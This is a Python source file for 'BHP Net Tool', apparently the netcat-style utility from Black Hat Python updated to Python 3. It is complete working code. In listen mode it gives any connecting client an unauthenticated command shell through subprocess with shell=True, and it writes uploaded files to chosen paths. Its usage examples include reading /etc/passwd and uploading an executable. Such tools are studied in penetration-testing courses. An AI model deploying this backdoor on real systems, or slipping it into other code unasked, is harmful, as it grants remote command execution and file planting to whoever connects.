#!/usr/bin/env python3
import sys
import socket
import getopt
import threading
import subprocess

# globals
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def usage():
    print("BHP Net Tool")
    print()
    print("Usage: bhpnet.py -t target_host -p port")
    print("-l --listen    listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run   execute the given file upon receiving a connection")
    print("-c --command   initialize a command shell")
    print("-u --upload=destination    upon receiving connection upload a file and write to [destination]")
    print()
    print("Examples:")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e 'cat /etc/passwd'")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)


def client_sender(buffer):
    """Used when acting as a client (connect to -t -p)."""
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))

        if buffer:
            if isinstance(buffer, str):
                buffer = buffer.encode()
            client.sendall(buffer)

        while True:
            # receive response
            response = b""
            while True:
                data = client.recv(4096)
                if not data:
                    break
                response += data
                if len(data) < 4096:
                    break

            if response:
                try:
                    print(response.decode(errors="ignore"), end="")
                except Exception:
                    print(response)

            # get more input from the user
            try:
                user_input = input("> ")
            except EOFError:
                break
            user_input = (user_input + "\n").encode()
            client.sendall(user_input)
    except Exception as e:
        print(f"[*] Exception! Exiting. ({e})")
    finally:
        client.close()


def client_handler(client_socket):
    """Handle incoming client connection (server side)."""
    global upload_destination, execute, command

    # handle upload
    if upload_destination:
        file_buffer = b""
        # read all data until nothing is sent
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            file_buffer += data
        try:
            with open(upload_destination, "wb") as fd:
                fd.write(file_buffer)
            client_socket.sendall(f"Successfully saved file to {upload_destination}\r\n".encode())
        except Exception as e:
            client_socket.sendall(f"Failed to save file to {upload_destination}: {e}\r\n".encode())

    # handle execute
    if execute:
        output = run_command(execute)
        # run_command returns string
        client_socket.sendall(output.encode())

    # handle command shell
    if command:
        try:
            while True:
                client_socket.sendall(b"<BHP:#> ")
                cmd_buffer = b""
                # receive until newline
                while b"\n" not in cmd_buffer:
                    chunk = client_socket.recv(1024)
                    if not chunk:
                        break
                    cmd_buffer += chunk
                if not cmd_buffer:
                    break
                # decode and run
                try:
                    cmd_str = cmd_buffer.decode(errors="ignore").rstrip()
                except Exception:
                    cmd_str = ""
                if cmd_str:
                    response = run_command(cmd_str)
                    client_socket.sendall(response.encode())
        except Exception as e:
            print(f"[!] Client shell exception: {e}")
        finally:
            client_socket.close()


def server_loop():
    """Listen for incoming connections and spin a thread per client."""
    global target, port
    if not target:
        target_host = "0.0.0.0"
    else:
        target_host = target

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((target_host, port))
    server.listen(5)
    print(f"[*] Listening on {target_host}:{port}")
    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.daemon = True
        client_thread.start()


def run_command(cmd):
    """Run a system command and return its output as string."""
    cmd = cmd.rstrip()
    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
        return output.decode(errors="ignore")
    except subprocess.CalledProcessError as e:
        return e.output.decode(errors="ignore") if e.output else "Failed to execute command.\r\n"
    except Exception:
        return "Failed to execute command.\r\n"


def main():
    global listen, port, execute, command, upload_destination, target

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args = getopt.getopt(
            sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute=", "target=", "port=", "command", "upload="]
        )
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    # client mode (send)
    if not listen and target and port > 0:
        buffer = sys.stdin.read()
        client_sender(buffer)

    # server mode (listen)
    if listen:
        server_loop()


if __name__ == "__main__":
    main()
